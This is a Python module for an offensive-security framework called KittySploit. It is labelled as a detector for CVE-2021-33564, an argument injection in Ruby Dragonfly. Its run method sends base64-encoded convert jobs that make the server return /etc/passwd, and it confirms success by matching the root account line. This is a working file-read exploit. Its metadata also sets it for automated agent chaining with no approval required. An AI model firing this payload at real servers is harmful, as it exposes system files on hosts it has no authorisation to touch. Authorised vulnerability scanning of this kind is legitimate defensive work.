#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Ruby Dragonfly before 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ruby Dragonfly <1.4.0 - Remote Code Execution Detection',
        'description': 'Ruby Dragonfly before 1.4.0 contains an argument injection vulnerability that allows remote attackers to read and write to arbitrary files via a crafted URL when the verify_url option is disabled. This may lead to code execution. The problem occurs because the generate and process features mishandle use of the ImageMagick convert utility.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'rce', 'ruby', 'injection', 'dragonfly_project', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://zxsecurity.co.nz/research/argunment-injection-ruby-dragonfly/',
            'https://github.com/markevans/dragonfly/compare/v1.3.0...v1.4.0',
            'https://github.com/markevans/dragonfly/commit/25399297bb457f7fcf8e3f91e85945b255b111b5',
            'https://github.com/mlr0p/CVE-2021-33564',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-33564',
        ],
        'cve': 'CVE-2021-33564',
    }

    def run(self):
        for path in ('/system/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvcGFzc3dkIiwgIm91dCJdXQ==', '/system/refinery/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvcGFzc3dkIiwgIm91dCJdXQ=='):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_regexes = ('root:.*:0:0:',)
            if (any(re.search(rx, body, 0) for rx in body_regexes)):
                self.set_info(
                    severity='critical',
                    reason="Ruby Dragonfly <1.4.0 - Remote Code Execution detected",
                    path=path,
                )
                return True
        return False

